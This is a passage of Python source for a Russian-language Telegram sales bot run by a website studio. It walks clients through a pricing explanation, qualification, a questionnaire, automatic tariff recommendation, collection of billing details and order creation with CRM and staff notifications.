        [{"text": "🚀 Начать оформление", "callback_data": "proj:go"}],
        help_row(),
    ]}


# Объяснение модели: голосовое + расшифровка + короткое резюме.
# ID голосового кладётся в переменную MODEL_VOICE_FILE_ID (получить: /voiceid).
MODEL_VOICE_FILE_ID = os.environ.get("MODEL_VOICE_FILE_ID", "")

MODEL_SUMMARY_MD = (
    "# 💡 Как мы работаем\n\n"
    "Если коротко: вы видите готовый сайт раньше, чем платите.\n\n"
    "| | |\n|---|---|\n"
    "| Разработка | **0 ₽** |\n"
    "| Сначала | собираем сайт и показываем вживую |\n"
    "| Потом | один пакет правок одним сообщением |\n"
    "| Затем | финальная версия на утверждение |\n"
    "| И только тогда | оплата пакета запуска |\n"
    "| После оплаты | домен, формы, аналитика, публикация |\n\n"
    "---\n\n"
    "### Что это значит на практике\n"
    "- До того как вы утвердите сайт, вы не платите **ничего** - ни предоплаты, "
    "ни брони, ни «оплатите первый этап»\n"
    "- Стоимость запуска известна заранее, сюрпризов в конце не будет\n"
    "- Правки собираются одним списком: так быстрее и дешевле для всех\n"
    "- Домен оформляется на вас, доступы у вас\n\n"
    "> Чек официальный, через «Мой налог» (422-ФЗ)."
)


def model_kb():
    return {"inline_keyboard": [
        [{"text": "✅ Понятно, продолжаем", "callback_data": "model:ok"}],
        [{"text": "💬 Есть вопрос", "callback_data": "ask:mgr"}],
        [{"text": "⬅️ Назад", "callback_data": "brief:niche"}],
    ]}


def show_model_explain(chat_id, uid, mid=None):
    """Экран объяснения модели перед анкетой: голос (если записан) + текст."""
    if MODEL_VOICE_FILE_ID:
        try:
            tg("sendVoice", chat_id=chat_id, voice=MODEL_VOICE_FILE_ID,
               caption="Как устроена работа - 40 секунд. Ниже то же самое текстом.")
        except Exception as e:
            print("voice err", e)
    if mid:
        edit_rich(chat_id, mid, MODEL_SUMMARY_MD, reply_markup=model_kb())
    else:
        send_rich(chat_id, MODEL_SUMMARY_MD, reply_markup=model_kb())
    crm_set(uid, "project_setup", notify=False)


# ─────────────────────── Квалификация: 8 подтверждений ───────────────────────

QUAL_POINTS = [
    ("price_ok", "Стоимость пакета запуска понятна и подходит",
     "Сумма названа заранее и не изменится после сборки"),
    ("pay_after_demo", "Готовы оплатить запуск, когда увидите согласованный результат",
     "Оплата только после того, как сайт вам подойдёт"),
    ("one_revision", "Правки собираются одним пакетом",
     "Один список одним сообщением - так быстрее и дешевле"),
    ("materials", "Материалы предоставите: фото, тексты, логотип",
     "Чего-то нет - скажем чем заменить или упакуем за отдельную плату"),
    ("scope", "Границы пакета понятны",
     "Что входит и что оплачивается отдельно"),
    ("deadline", "Сроки подходят: первая версия за 2-3 дня после материалов",
     "Дальше правки и запуск"),
    ("decision_maker", "Решение по сайту принимаете вы",
     "Или согласование не затянет процесс"),
    ("standard", "Нестандартных требований нет",
     "Личный кабинет, маркетплейс, сложные интеграции - обсуждаются отдельно"),
]


def qual_step_kb(i):
    rows = [[{"text": "✅ Подтверждаю", "callback_data": f"q8:{i}:yes"}],
            [{"text": "❓ Нужно обсудить", "callback_data": f"q8:{i}:ask"}]]
    rows.append([{"text": "⬅️ Назад",
                  "callback_data": f"q8:back:{i - 1}" if i > 0 else "pkg:show"}])
    return {"inline_keyboard": rows}


def qual_render(i):
    key, title, hint = QUAL_POINTS[i]
    n = len(QUAL_POINTS)
    bar = "🟩" * round((i / n) * 8) + "⬜️" * (8 - round((i / n) * 8))
    return (f"{bar}  **{i + 1} из {n}**\n\n"
            f"## {title}\n\n> {hint}")


def qual_push(chat_id, uid, i, answers, mid=None):
    state_set(uid, {"flow": "qual8", "i": i, "answers": answers, "mid": mid})
    if mid:
        edit_rich(chat_id, mid, qual_render(i), reply_markup=qual_step_kb(i))
    else:
        send_rich(chat_id, qual_render(i), reply_markup=qual_step_kb(i))


def qual_finish(chat_id, uid, user, answers, mid=None):
    """Все восемь пунктов подтверждены → допуск в производство."""
    state_del(uid)
    p = user_get(uid) or {}
    p["qualified"] = True
    p["qual_answers"] = answers
    user_save(uid, p)
    crm_set(uid, "qualified",
            "Подтверждено: " + ", ".join(k for k, v in answers.items() if v == "yes"))
    edit_rich(chat_id, mid,
              "# ✅ Всё согласовано\n\n"
              "Проект допущен к производству. Осталось передать материалы - "
              "мы заведём под вас папку на Google Диске и пришлём ссылку.\n\n"
              "> Обычно это занимает несколько минут в рабочее время.",
              reply_markup={"inline_keyboard": [
                  [{"text": "📎 Что нужно прислать", "callback_data": "mat:list"}],
                  help_row()]})
    try:
        create_task("lead", uid, "Создать папку Drive и выдать клиенту ссылку",
                    description="Клиент прошёл квалификацию, статус «Квалифицирован».",
                    telegram_id=uid, priority="high", notify=False)
        schedule_followup(uid, "materials_missing", user.get("username", ""))
    except Exception as e:
        print("qual finish err", e)
    log_event(uid, "qualified")
    crm_set(uid, "materials_waiting", notify=False)


MATERIALS_MD = (
    "# 📎 Что нужно прислать\n\n"
    "Чем полнее материалы, тем меньше правок потом. Если чего-то нет - "
    "не страшно, скажите, подскажем чем заменить.\n\n"
    "- [ ] Логотип в исходном файле\n"
    "- [ ] Фотографии работ, объектов или товаров\n"
    "- [ ] Фото команды, офиса или производства\n"
    "- [ ] Отзывы: скриншоты, тексты, ссылки\n"
    "- [ ] Документы: лицензии, сертификаты, дипломы\n"
    "- [ ] Прайс или ориентир по ценам\n"
    "- [ ] Тексты о компании, если они уже написаны\n\n"
    "---\n\n"
    "> Загружать можно прямо сюда - бот разложит файлы по папкам. "
    "Или в папку на Диске, если менеджер уже прислал ссылку."
)


def materials_kb():
    return {"inline_keyboard": [
        [{"text": "📤 Загрузить материалы", "callback_data": "up:menu"}],
        [{"text": "✅ Всё отправил", "callback_data": "mat:done"}],
        [{"text": "🎨 Нет контента - упакуйте за меня", "callback_data": "mat:help"}],
        help_row(),
    ]}


def goal_picker_kb():
    rows = [[{"text": label, "callback_data": f"goal:{gid}"}] for gid, label in GOALS]
    rows.append([{"text": "🏠 В меню", "callback_data": "b:home"}])
    return {"inline_keyboard": rows}


def start_anketa(chat_id, uid, user, mid=None):
    """Шаг 4: запуск анкеты, собранной под связку «цель + ниша».
    Сначала показываем клиенту первый вопрос - только потом фоновые дела
    (лог, уведомление админам, дожимы), чтобы клиент не ждал ответа."""
    p = user_get(uid) or {}
    goal = p.get("client_goal")
    niche = p.get("client_niche")
    steps = build_brief_steps(goal, niche)
    st = {"flow": "brief", "i": 0, "data": {}, "mid": mid, "steps": steps}
    # ниша сразу попадает в данные анкеты - она нужна промптам как есть
    if niche and niche != "other":
        st["data"]["niche"] = NICHE_RU.get(niche, "").split(" ", 1)[-1]
    brief_push(chat_id, uid, st)
    log_event(uid, "questionnaire_start")
    lead_touch(uid, username=user.get("username"), status="questionnaire_started", action="questionnaire_start")
    client_set_stage(client_id_of(uid), "questionnaire_started")
    notify_admins(f"📝 Клиент начал анкету: id {uid} "
                  f"{('@' + user.get('username')) if user.get('username') else ''}\n"
                  f"Цель: {GOAL_RU.get(goal, '-')} · Ниша: {NICHE_RU.get(niche, '-')} "
                  f"({len(steps)} вопросов)")
    cancel_followups(uid, ("idle_after_start",))
    schedule_followup(uid, "questionnaire_abandoned", user.get("username", ""))


def recommend_tariff(goal, data, niche=None):
    """Шаг 5: автоподбор пакета по связке «цель + ниша» + сигналам анкеты.
    Работает только с нашим прайсом - ничего не выдумывает."""
    text = " ".join(str(data.get(k, "")) for k in
                     ("additional_functions", "main_action", "typical_request",
                      "needs_booking", "realty_base", "has_delivery", "has_menu",
                      "furniture_custom", "lead_handling")).lower()
    has_crm = "crm" in text or "срм" in text
    has_calc = "калькулятор" in text or "расчёт стоимости" in text
    has_cart = "корзин" in text or "купить товар" in text
    has_booking = "запис" in text or "🗓" in text or "брониров" in text
    has_catalog = "каталог" in text or "товар" in text

    # Сигналы от ниши: где онлайн-запись/каталог нужны почти всегда
    NICHE_BOOKING = {"beauty", "fitness", "dental", "hotel", "food"}
    NICHE_CATALOG = {"realty", "furniture", "manufacturing"}
    NICHE_CRM = {"realty", "b2b"}

    GOAL_BASE = {"visitka": "start", "leads": "leads", "booking": "leads", "catalog": "leads"}
    tid = GOAL_BASE.get(goal)
    addons, reasons = [], []

    # Итоговые потребности = сигналы анкеты + типовые потребности ниши
    want_booking = (goal == "booking" or has_booking
                    or (niche in NICHE_BOOKING and str(data.get("needs_booking", "")).startswith("Да")))
    want_catalog = goal == "catalog" or has_catalog or niche in NICHE_CATALOG
    want_crm = has_crm or niche in NICHE_CRM

    if want_booking:
        addons.append("booking"); reasons.append("вам нужна онлайн-запись")
    if want_catalog:
        addons.append("catalog"); reasons.append("нужен каталог товаров/услуг")
    if has_cart:
        addons.append("cart"); reasons.append("клиенты должны оформлять заказ прямо на сайте")
    if niche in NICHE_CRM:
        reasons.append(f"в вашей нише ({NICHE_RU.get(niche, niche)}) важно не терять обращения")

    complex_needs = sum([want_crm, has_calc, has_cart and want_booking])
    if want_crm or complex_needs >= 2:
        tid = "system"
        reasons.append("нужна CRM/учёт заявок - это входит в пакет «Сайт как система продаж»")
    elif tid is None:
        tid = "leads"  # безопасный дефолт, если цель «не знаю» - самый сбалансированный пакет
        reasons.append("это самый сбалансированный пакет для получения заявок")

    # «Старт» не тянет доп.функционал (см. limits в TARIFF_PROFILES) - поднимаем пакет,
    # чтобы не пообещать клиенту то, что в его тариф не входит.
    if tid == "start" and (want_crm or has_calc or has_cart or want_booking or want_catalog):
        tid = "leads"
        reasons.append("под нужный вам функционал «Старт» тесноват - берём «Сайт + заявки»")

    # Базовое обоснование от цели - чтобы клиент всегда видел связь с тем,
    # что он сам сказал, а не дежурную фразу «оптимальный баланс».
    GOAL_REASON = {
        "visitka": "вам нужно, чтобы о вас узнали и могли связаться - для этого хватает "
                   "аккуратного одностраничного сайта, переплачивать не за что",
        "leads": "ваша цель - заявки, а в этом пакете как раз усиленная структура под них, "
                 "блок доверия, FAQ и уведомления о каждом обращении",
        "booking": "клиенты должны записываться сами, без переписки",
        "catalog": "нужно показать ассортимент структурно, а не списком в тексте",
        "unsure": "вы пока присматриваетесь - берём сбалансированный вариант, "
                  "который закрывает большинство задач и не требует переплаты",
    }
    base = GOAL_REASON.get(goal)
    if base:
        reasons.insert(0, base)
    if niche and niche != "other" and not any("нише" in r for r in reasons):
        reasons.append(f"структуру соберём под вашу отрасль "
                       f"({NICHE_RU.get(niche, '').split(' ', 1)[-1].lower()})")

    addons = list(dict.fromkeys(a for a in addons if a in SERVICE))
    reasoning = "; ".join(dict.fromkeys(reasons)) or "это оптимальный баланс цены и возможностей для вашей задачи"
    return tid, addons, reasoning


def business_analysis(uid, d):
    """Блок «что мы поняли о вашем бизнесе» - строится строго на ответах клиента.
    Ничего не выдумываем: если данных нет, строку просто не показываем."""
    p = user_get(uid) or {}
    goal = p.get("client_goal")
    niche = p.get("client_niche")
    rows = []
    company = d.get("company_name") or p.get("name")
    if company:
        line = f"🏢 **{company}**"
        if niche and niche != "other":
            line += f" · {NICHE_RU.get(niche, '').split(' ', 1)[-1].lower()}"
        rows.append(line)
    if d.get("city"):
        rows.append(f"📍 Работаете в: {d.get('geo') or d['city']}")
    if d.get("priority_services"):
        rows.append(f"⭐ Продвигаем в первую очередь: **{d['priority_services']}**")
    if d.get("target_audience"):
        aud = d["target_audience"]
        rows.append(f"🎯 Ваш клиент: {aud[:110] + '…' if len(aud) > 110 else aud}")
    if goal:
        rows.append(f"🚀 Главная задача сайта: {GOAL_RU.get(goal, '').split(' ', 1)[-1].lower()}")

    # что из этого следует для сайта - короткие выводы, а не пересказ анкеты
    concl = []
    if d.get("trust_facts"):
        concl.append("вам есть чем закрывать сомнения клиентов - вынесем это в блок доверия")
    if d.get("advantages"):
        concl.append("отстроимся от конкурентов на ваших сильных сторонах")
    mats = sum(1 for k in ("has_logo", "has_photos", "has_portfolio", "has_reviews", "documents")
               if d.get(k) == "Да, есть")
    if mats >= 3:
        concl.append("материалов достаточно - сайт получится «живым», без стоковых картинок")
    elif mats == 0:
        concl.append("материалов пока нет - сделаем аккуратно на типографике и структуре, "
                     "фото и отзывы добавим позже")
    if str(d.get("show_prices", "")).startswith("Да"):
        concl.append("покажем цены - это отсекает нецелевые обращения")

    out = "\n".join(rows)
    if concl:
        out += "\n\n### Что это значит для сайта\n" + "\n".join(f"- {c}" for c in concl)
    return out or "Разберём ваш проект вместе с менеджером."


def show_tariff_recommendation(chat_id, uid, goal, data, mid=None):
    """Шаг 5: показать клиенту автоподобранный пакет."""
    p0 = user_get(uid) or {}
    tid, addons, reasoning = recommend_tariff(goal, data, p0.get("client_niche"))
    p = user_get(uid) or {}
    p["chosen_tariff"] = tid
    p["recommended_addons"] = addons
    user_save(uid, p)
    log_event(uid, "tariff_recommended", tid)
    recompute_tags(uid)
    t = TARIFF[tid]
    addons_md = ("\n\n### ➕ Пригодятся к пакету\n"
                 + "\n".join(f"- {SERVICE[a]['name']}" for a in addons)) if addons else ""
    md = (f"# 🔎 Мы проанализировали вашу компанию\n\n"
          f"{business_analysis(uid, data)}\n\n"
          f"---\n\n"
          f"# 🎯 Рекомендуем: «{t['name']}»\n\n"
          f"| | |\n|---|---|\n"
          f"| Запуск | **{tariff_price(t)}** |\n| Разработка | **0 ₽** |\n\n"
          f"*{t['desc']}*\n\n"
          f"### Почему именно этот пакет\n"
          f"{(reasoning[:1].upper() + reasoning[1:]) if reasoning else ''}."
          f"{addons_md}\n\n"
          "> Это рекомендация, а не ограничение - можете выбрать любой другой.")
    kb = {"inline_keyboard": [
        [{"text": "✅ Подходит - зафиксируем условия", "callback_data": "qual:pkg_ok"}],
        [{"text": "📦 Посмотреть все тарифы", "callback_data": "tariffs:list"}],
        [{"text": "⬅️ Изменить ответы анкеты", "callback_data": "brief:resume"}],
    ]}

    # Ключевой экран воронки: клиент впервые видит пакет, и карточка должна быть
    # с картинкой. Сообщение нельзя превратить из текста в фото редактированием,
    # поэтому старое убираем и шлём пару «карточка + разбор».
    card = send_tariff_card(chat_id, tid, caption=(
        f"🎯 <b>Рекомендуем: «{t['name']}»</b>\n"
        f"Запуск {tariff_price(t)} · разработка <b>0 ₽</b>"))
    if card:
        if mid:
            try:
                tg("deleteMessage", chat_id=chat_id, message_id=mid)
            except Exception:
                pass
        send_rich(chat_id, md, None, kb)
        return

    if mid:
        edit_rich(chat_id, mid, md, None, kb)
    else:
        send_rich(chat_id, md, None, kb)


def show_package_summary(chat_id, uid, mid=None):
    """Шаг 6: ознакомление - что входит / чего нет / что нужно от клиента."""
    p = user_get(uid) or {}
    tid = p.get("chosen_tariff") or "start"
    t = TARIFF[tid]
    includes = "\n".join(f"✓ {x}" for x in t["includes"][:12])
    limits = TARIFF_PROFILES.get(tid, {}).get("limits", "")
    limits = limits.replace("не добавлять ", "").replace(" - они не входят в этот тариф", "")
    limits = limits.replace(", если они не куплены отдельно", "")
    txt = (f"📋 <b>«{t['name']}» - что входит</b>\n\n{includes}\n\n"
           f"💰 <b>Запуск: {tariff_price(t)}</b>\n"
           f"Разработка - 0 ₽, абонентской платы нет.\n"
           + (f"\n🚫 <b>Не добавляем:</b> {limits}.\n"
              "<i>Это можно докупить отдельной опцией или взять пакет выше.</i>\n" if limits else "") +
           "\n📎 <b>Что нужно от вас:</b> материалы (тексты, фото, логотип - если есть) "
           "и быстрые ответы, когда покажем сайт.")
    kb = {"inline_keyboard": [
        [{"text": "✅ Условия подходят - дальше", "callback_data": "q8:go"}],
        [{"text": "➕ Добавить опции", "callback_data": "options:list"}],
        [{"text": "⬅️ Выбрать другой пакет", "callback_data": "tariffs:list"}],
        help_row(),
    ]}
    # структурированная версия: заголовок, чек-лист состава, таблица цены
    md = (f"## 📋 «{t['name']}»\n\n### Что входит\n"
          + "\n".join(f"- [x] {x}" for x in t["includes"][:12])
          + f"\n\n---\n\n| | |\n|---|---|\n| Разработка | **0 ₽** |\n"
            f"| Запуск под ключ | **{tariff_price(t)}** |\n\n"
          + (f"> 🚫 **Не добавляем:** {limits}.\n> *Это можно докупить отдельной "
             "опцией или взять пакет выше.*\n\n" if limits else "")
          + "📎 **Что нужно от вас:** материалы (тексты, фото, логотип - если есть) "
            "и быстрые ответы, когда покажем сайт.")
    if mid:
        edit_rich(chat_id, mid, md, None, kb)
    else:
        send_rich(chat_id, md, None, kb)


def finish_brief(chat_id, user, data, mid=None):
    username = f"@{user.get('username')}" if user.get("username") else "-"
    uid = user.get("id")
    # компактные ответы → полный набор полей для промптов
    data = normalize_brief_data(data)

    # Сначала отвечаем клиенту - остальное (лог, CRM, Sheets, уведомления команде)
    # уходит следом, чтобы клиент не ждал несколько секунд ответа бота.
    # Порядок: анкета → как работаем → квалификация → и только потом тариф.
    # Тариф показываем последним, когда клиент уже понял модель и прошёл отбор.
    _set(f"onyx:quest:{uid}", data, ttl=YEAR)
    # Модель объяснили ДО анкеты, поэтому сразу переходим к пакету запуска.
    edit_rich(chat_id, mid,
              "# ✅ Анкета принята\n\n"
              "Всё, что нужно для сборки, у нас есть.\n\n"
              "### Заведём личный кабинет?\n\n"
              "Он уже создан на ваше имя - это ваш раздел прямо здесь, в боте. "
              "Внутри:\n\n"
              "- **Статус заказа** - на каком этапе сборка, без вопросов «ну как там?»\n"
              "- **Материалы** - фото, логотип и тексты можно досылать в любой момент\n"
              "- **Полезные письма** - разборы и приёмы по теме вашего бизнеса, "
              "не чаще раза в неделю и только по темам, которые выберете сами\n\n"
              "Дальше покажем пакет запуска под вашу задачу и зафиксируем условия.",
              None,
              {"inline_keyboard": [
                     [{"text": "📦 Показать пакет запуска", "callback_data": "pkg:recommend"}],
                     [{"text": "👤 Открыть личный кабинет", "callback_data": "b:cab"}],
                     [{"text": "⬅️ Изменить ответы", "callback_data": "brief:resume"}],
                     help_row()]})
    crm_set(uid, "anketa_done", notify=False)

    # --- Фоновая часть (не блокирует ответ клиенту) ---
    contact = data.get("phone") or data.get("messengers") or ""
    upsert_user(uid, name=data.get('company_name'), contact=contact, username=user.get("username"))
    mark_questionnaire_filled(uid, data)
    sheet_questionnaire(uid, username, data)
    log_event(uid, "questionnaire_done")
    lead_touch(uid, username=user.get("username"), name=data.get("company_name"),
               status="questionnaire_completed", action="questionnaire_done")
    # Core: сохранить НОВУЮ версию анкеты (старые не перезаписываем) + журнал
    try:
        c = ensure_client(uid, user)
        q = questionnaire_save_version(c["client_id"], None, data)
        p2 = user_get(uid) or {}
        p2["last_questionnaire_id"] = q["questionnaire_id"]
        user_save(uid, p2)
        client_set_stage(c["client_id"], "questionnaire_completed")
    except Exception as e:
        print("core quest version err", e)
    # FACTORY: регистрируем данные анкеты. Промпты (ТЗ п.6-7) собираются ПОСЛЕ того,
    # как клиент выберет тариф и оформит заявку - см. finish_cap().
    try:
        f = factory_upsert_from_questionnaire(uid, data, username)
        miss = f.get("missing_data", "")
        notify_admins(
            f"📊 <b>Анкета заполнена</b>\nid {uid} {username}\n"
            f"Компания: {data.get('company_name', '-')} · {data.get('niche', '-')}, {data.get('city', '-')}\n"
            f"Недостаёт: {miss}\n"
            "Промпты соберутся автоматически после выбора тарифа и оформления заявки.")
        # Клиенту про недостающие материалы скажем в сводке заявки - не разрывая
        # воронку отдельным сообщением (всё живёт в одном сообщении).
        if miss and miss != "-":
            _set(f"onyx:miss:{uid}", miss, ttl=YEAR)
    except Exception as e:
        print("factory err", e)
        log_error("prompts", f"не собрались данные анкеты: {e}", notify=True)
    cancel_followups(uid, ("questionnaire_abandoned", "idle_after_start"))
    try:
        domain_from_questionnaire(uid, data)  # доменный модуль
    except Exception as e:
        print("domain_from_questionnaire err", e)
    recompute_tags(uid)
    notify_manager(
        "🔔 <b>Новая анкета ONYX</b>\n\n"
        f"🏢 Компания: {data.get('company_name','-')}\n"
        f"🧭 Ниша: {data.get('niche','-')} • Город: {data.get('city','-')}\n"
        f"💬 Telegram: {username} (id {uid})\n"
        f"📞 Телефон: {data.get('phone','-')} • Мессенджеры: {data.get('messengers','-')}\n"
        f"📝 Деятельность: {data.get('business_description','-')}\n"
        f"🛠 Услуги: {data.get('main_services','-')}\n"
        f"🎯 Аудитория: {data.get('target_audience','-')} • Действие: {data.get('main_action','-')}\n"
        f"🌐 Домен: {data.get('has_domain','-')} {data.get('domain_name','')}\n"
        f"⚙️ Доп.функции: {data.get('additional_functions','-')}"
    )


def brief_text_input(chat_id, user, st, text, contact, msg_id=None):
    uid = user["id"]
    step = steps_of(st)[st["i"]]
    st["data"][step["key"]] = contact.get("phone_number") if (contact and step.get("contact")) else text.strip()
    st["i"] += 1
    if msg_id:
        try:
            tg("deleteMessage", chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
    brief_advance(chat_id, user, uid, st)


# ------------------------- Формы-захваты -------------------------
# Удалены как неиспользуемые (заменены новыми разделами):
#   "audit"   -> раздел «Бесплатный аудит» (flow audit_url, Этап 7)
#   "status"  -> раздел «Мой заказ» (Этап 5)
#   "partner" -> раздел «Стать партнёром» (flow partner, Этап 9)
# Необязательные шаги помечены opt=True (можно пропустить). Реквизиты нужны для будущего
# официального счёта через «Мой налог» - счёт выставляется ПОСЛЕ утверждения сайта.
CAP = {
    "legal": {"steps": [("company", "Название компании / ИП:", False),
                        ("inn", "ИНН:", False),
                        ("kpp", "КПП (если есть, иначе «Пропустить»):", True),
                        ("legal_address", "Юридический адрес (если нужен для счёта, иначе «Пропустить»):", True),
                        ("contact_person", "Контактное лицо:", False),
                        ("email", "E-mail для документов:", False),
                        ("phone", "Телефон для связи:", False)],
              "type": "Реквизиты юрлица"},
    "individual": {"steps": [("name", "На кого оформить (ФИО):", False),
                             ("phone", "Телефон для связи:", False),
                             ("email", "E-mail для документов:", False)],
                   "type": "Реквизиты физлица"},
}


def send_cap_step(chat_id, st):
    kind = st["kind"]; i = st["i"]
    step = CAP[kind]["steps"][i]
    key, q = step[0], step[1]
    opt = len(step) > 2 and step[2]
    n = len(CAP[kind]["steps"])
    head = f"🧾 <b>Реквизиты ({i+1}/{n})</b>\n{q}"
    rows = []
    if key == "phone":
        rows.append([{"text": "📱 Отправить мой номер", "request_contact": True}])
    if opt:
        rows.append([{"text": "⏭ Пропустить"}])
    rows.append([{"text": "🏠 Главное меню"}])
    send(chat_id, head, {"keyboard": rows, "resize_keyboard": True})


def order_items_with_tariff(uid, cart):
    """Позиции заявки = выбранный тариф (если есть) + опции из корзины. Возвращает (items[], total)."""
    items, total = [], 0
    p = user_get(uid) or {}
    tid = p.get("chosen_tariff")
    if tid in TARIFF:
        items.append(f"Тариф: {TARIFF[tid]['name']}")
        total += TARIFF[tid]["price"]
    items += [ITEM[c][0] for c in cart if c in ITEM]
    total += cart_total(cart)
    return items, total


def finish_cap(chat_id, user, st):
    """Реквизиты собраны → создаём заявку в статусе «ожидает консультации».
    Счёт НЕ выставляется сейчас - только после разработки и утверждения сайта."""
    kind = st["kind"]; data = st["data"]
    uid = user.get("id")
    username = f"@{user.get('username')}" if user.get("username") else "-"
    payer = "Юрлицо" if kind == "legal" else "Физлицо"
    comment = " | ".join(f"{k}: {v}" for k, v in data.items() if not k.startswith("_"))
    reqs = {"company": data.get("company", ""), "inn": data.get("inn", ""),
            "kpp": data.get("kpp", ""), "legal_address": data.get("legal_address", ""),
            "contact_person": data.get("contact_person", ""),
            "email": data.get("email", ""), "payer_name": data.get("name", ""),
            "phone": data.get("phone", "")}
    target_oid = None
    if st.get("order_id"):
        o = order_get(st["order_id"])
        if o:
            o.update({**reqs, "payment_type": payer, "payment_method": "Счёт (Мой налог)",
                      "status": "consultation_pending", "updated": now_str()})
            order_save(o); sheet_order(o); target_oid = o["id"]
    elif st.get("cart") is not None:
        items, total = order_items_with_tariff(uid, st.get("cart") or [])
        oid = order_new(uid, items, total, payer, status="consultation_pending",
                        payment_method="Счёт (Мой налог)", extra=reqs)
        cart_set(uid, [])
        target_oid = oid

    # Заказ создан - сразу отвечаем клиенту. Остальное (Core, промпты, уведомления
    # админам) уходит следом фоном, чтобы клиент не ждал ответа несколько секунд.
    o = order_get(target_oid) if target_oid else None
    total_txt = fmt_amount(o.get("total", 0)) if o else "-"
    send_rich(chat_id,
              "# 🎉 Заявка принята!\n\n"
              f"Сумма к оплате при запуске: **{total_txt}**\n\n"
              "## Что дальше\n"
              "1. Свяжемся с вами и обсудим детали\n"
              "2. Соберём сайт и покажем вам\n"
              "3. Понравится - выставим счёт и опубликуем\n\n"
              "---\n\n"
              "> 💳 **Платить сейчас не нужно.** Счёт придёт только после того, "
              "как вы увидите готовый сайт и утвердите его.\n\n"
              "*Оплата - переводом, по СБП или по реквизитам. "
              "Чек официальный, через «Мой налог» (422-ФЗ).*", None,
              {"inline_keyboard": [[{"text": "📦 Мой заказ", "callback_data": "myorder:open"}],
                                   [{"text": "👤 Личный кабинет", "callback_data": "b:cab"}]]})

    upsert_user(uid, name=data.get("name") or None,
                contact=data.get("phone") or data.get("email"), username=user.get("username"))
    log_event(uid, "requisites_provided", str(target_oid or ""))
    lead_touch(uid, username=user.get("username"), status="cabinet_created", action="requisites_provided")
    recompute_tags(uid)
    # Core: создать сущность «Заявка» (application), связать с заказом, журнал, кабинет создан
    try:
        c = ensure_client(uid, user)
        p3 = user_get(uid) or {}
        app = application_create(
            c["client_id"], tariff_id=p3.get("chosen_tariff"),
            options=[x for x in cart_get(uid)] or (st.get("cart") or []),
            questionnaire_id=p3.get("last_questionnaire_id"), requisites=reqs,
            source=p3.get("source", ""))
        application_set_status(app["application_id"], "consultation_pending", actor="client")
        if target_oid:
            o2 = order_get(target_oid)
            if o2:
                o2["application_id"] = app["application_id"]; order_save(o2)
        cc = client_get(c["client_id"]) or {}
        cc["cabinet_created"] = True; client_save(cc)
        client_set_stage(c["client_id"], "consultation_pending")
    except Exception as e:
        print("core application err", e)
    # ТЗ п.6-7: тариф выбран и заказ создан - теперь можно собрать 6 производственных промптов
    try:
        d = _get(f"onyx:quest:{uid}") or {}
        row = build_prompts_row(uid, d)
        okgen = row.get("generation_status") == "READY"
        tname = row.get("tariff_name", "-")
        fmiss = (factory_get(uid) or {}).get("missing_data", "-")
        notify_admins(
            ("✅ <b>Промпты готовы</b>" if okgen else "⚠️ <b>Ошибка генерации промптов</b>") +
            f"\nЗаказ: {row.get('order_id') or target_oid or '-'} · id {uid}\n"
            f"Компания: {d.get('company_name', '-')} · {d.get('niche', '-')}, {d.get('city', '-')}\n"
            f"Тариф: {row.get('tariff_profile')} «{tname}»\n"
            f"Контент: {row.get('content_mode')} · Дизайн: {row.get('design_mode')}\n"
            f"Опции: {row.get('purchased_options')}\n"
            f"Недостаёт: {fmiss}\n"
            + (f"\n❗ {row.get('error_message')}" if not okgen else
               f"\nЗабрать: /prompts {uid} (или /prompt1 {uid} … /prompt6 {uid})"))
    except Exception as e:
        print("factory/prompts err", e)
        log_error("prompts", f"не собрались промпты: {e}", notify=True)
    # Папка проекта на Google Drive - создаём сразу при оформлении заявки
    try:
        drive_ensure_folder(uid, notify_admin=True)
    except Exception as e:
        print("drive folder err", e)
    if target_oid:
        create_task("order", target_oid,
                    f"Провести консультацию с клиентом (заявка №{target_oid}, {payer})",
                    description=comment, telegram_id=uid, order_id=target_oid,
                    priority="high", notify=False)
    notify_admins(f"🔥 <b>Новая заявка - нужна консультация</b>\n💬 {username} (id {uid})\n"
                  f"Реквизиты ({payer}): {comment}")


def cap_text_input(chat_id, user, st, text, contact):
    if text == "🏠 Главное меню":
        state_del(user["id"]); main_menu(chat_id); return
    key = CAP[st["kind"]]["steps"][st["i"]][0]
    if text == "⏭ Пропустить":
        st["data"][key] = ""
    else:
        st["data"][key] = contact.get("phone_number") if (contact and key == "phone") else text
    st["i"] += 1
    if st["i"] >= len(CAP[st["kind"]]["steps"]):
        state_del(user["id"]); finish_cap(chat_id, user, st)
    else:
        state_set(user["id"], st); send_cap_step(chat_id, st)


def start_cap(chat_id, uid, kind, cart=None, order_id=None):
    st = {"flow": "cap", "kind": kind, "i": 0, "data": {}}
    if order_id:
        st["order_id"] = order_id
    else:
        # ВАЖНО: cart может быть пустым (клиент взял только тариф) - всё равно
        # передаём список, иначе finish_cap не создаст заявку.
        st["cart"] = list(cart or [])
    state_set(uid, st)
    send_cap_step(chat_id, st)


# ------------------------- Этап 3: оформление заказа -------------------------
def checkout(chat_id, user, uid, mid=None, head=""):
    cart = cart_get(uid)
    p = user_get(uid) or {}
    if not cart and not p.get("chosen_tariff"):
        edit_or_send(chat_id, mid, "🛒 Сначала выберите тариф и/или услуги.",
                     {"inline_keyboard": [[{"text": "📦 Тарифы", "callback_data": "tariffs:list"}],
                                          [{"text": "➕ Опции", "callback_data": "options:list"}]]})
        return
    if not anketa_done(uid):
        edit_or_send(chat_id, mid,
                     "Для оформления заявки сначала заполните короткую анкету на разработку сайта - "
                     "это поможет нам корректно подготовить сайт под ваш бизнес.",
                     {"inline_keyboard": [[{"text": "📝 Заполнить анкету", "callback_data": "brief:start"}]]})
        return
    edit_rich(chat_id, mid, head + checkout_summary_text(uid), None, {"inline_keyboard": [
        [{"text": "✅ Всё верно - к реквизитам", "callback_data": "checkout:go"}],
        [{"text": "📦 Изменить тариф", "callback_data": "tariffs:list"},
         {"text": "➕ Изменить опции", "callback_data": "options:list"}],
        [{"text": "📝 Изменить анкету", "callback_data": "brief:resume"}],
        [{"text": "⬅️ Назад к тарифу", "callback_data": "qual:pkg_ok"}],
    ]})


def checkout_summary_text(uid):
    """Точка 6: полная сводка заявки перед подтверждением - тариф, опции, анкета, сумма."""
    p = user_get(uid) or {}
    cart = cart_get(uid)
    items, total = order_items_with_tariff(uid, cart)
    q = _get(f"onyx:quest:{uid}") or {}
    tid = p.get("chosen_tariff")
    lines = ["# 🧾 Проверьте заявку", "", "| | |", "|---|---|"]
    lines.append(f"| Пакет | **{TARIFF[tid]['name']}** |" if tid in TARIFF
                 else "| Пакет | не выбран |")
